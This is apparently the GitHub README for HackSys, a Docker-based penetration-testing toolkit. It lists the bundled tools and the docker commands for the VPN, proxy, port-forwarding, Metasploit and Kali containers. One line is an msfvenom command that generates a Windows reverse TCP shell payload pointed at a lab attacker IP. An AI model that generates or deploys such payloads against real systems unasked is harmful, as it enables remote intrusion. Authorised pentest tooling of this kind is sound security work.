[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://github.com/antfie/HackSys/blob/master/LICENSE)

# HackSys

HackSys is a Docker image Anthony uses for penetration testing. It's main features are:

* Alpine based
* <4GB
* Security tools installed:
  * nmap
  * [sqlmap](http://sqlmap.org/)
  * [impacket](https://github.com/SecureAuthCorp/impacket)
  * SecLists
  * searchsploit
  * [evil-winrm](https://github.com/Hackplayers/evil-winrm)
  * [CeWL](https://digi.ninja/projects/cewl.php)
  * wfuzz
* Development tools installed:
  * Python
  * Go
  * Java
  * Ruby
* Easy to add in new capabilities via `apk add`
* Has a built-in SOCKS5 proxy (via SSH tunnel)
* Zsh

## Running

First pull down the latest container:

```
docker pull antfie/hacksys
```

### VPN

Ensure there is a single openVPN configuration file within the curreent directory and run the main VPN container with this:

```
docker run --rm -it -v $PWD/`ls *.ovpn`:/app/vpn --cap-add=NET_ADMIN --device /dev/net/tun --name vpn -p 127.0.0.1:9000-9100:9000-9100 --sysctl net.ipv6.conf.all.disable_ipv6=0 --entrypoint openvpn antfie/hacksys vpn
```

### SOCKS5 Proxy (For Burp)

```
docker run --rm -it --network=container:vpn --name proxy --entrypoint proxy antfie/hacksys
```

### Port Forward

To port forward for example RDP (3389) from 192.168.162.120:

```
docker run --rm -it --network=container:vpn --entrypoint fwd -e FWD_TO=192.168.162.120:3389 antfie/hacksys
```

### General Host

Use this command for most activities:

```
docker run --rm -it --network=container:vpn -v $PWD:/app antfie/hacksys
```

To mount stuff e.g. NFS shares you will need to add this parameter `--cap-add SYS_ADMIN`.

### Other Tools

It's easy to attach other tools to the VPN container to make use of the VPN connection.

#### Metasploit

```
docker run --rm -it --network=container:vpn -v $PWD:/app metasploitframework/metasploit-framework
```

#### MSF Venom

```
docker run --rm -it --network=container:vpn -v $PWD:/app --entrypoint bash metasploitframework/metasploit-framework
```

To use MSF Venom:

```
./msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.32 LPORT=4189 -f csharp > /app/x
```

#### Kali

```
docker run --rm -it --network=container:vpn -v $PWD:/app kalilinux/kali-rolling
```

## Building

```
docker pull alpine
docker build -t antfie/hacksys .
```

## Docker Maintenance

Remove all containers and images:

```
docker rm -f $(docker ps -a -q)
docker rmi $(docker images -q)
```

## Useful Shell Aliases

```zsh
alias hsv='dr -v $PWD/`ls *.ovpn`:/app/vpn --cap-add=NET_ADMIN --device /dev/net/tun --name vpn -p 9000-9100:9000-9100 --sysctl net.ipv6.conf.all.disable_ipv6=0 --entrypoint openvpn antfie/hacksys vpn'
alias hsp='dr --network=container:vpn --name proxy --entrypoint ssh-proxy antfie/hacksys'
alias hs='dr --network=container:vpn -v $PWD:/app antfie/hacksys'
alias hsm='dr --network=container:vpn -v $PWD:/app metasploitframework/metasploit-framework'
alias hsmv='dr --network=container:vpn -v $PWD:/app --entrypoint bash metasploitframework/metasploit-framework'
alias hsk='dr --network=container:vpn -v $PWD:/app kalilinux/kali-rolling'
```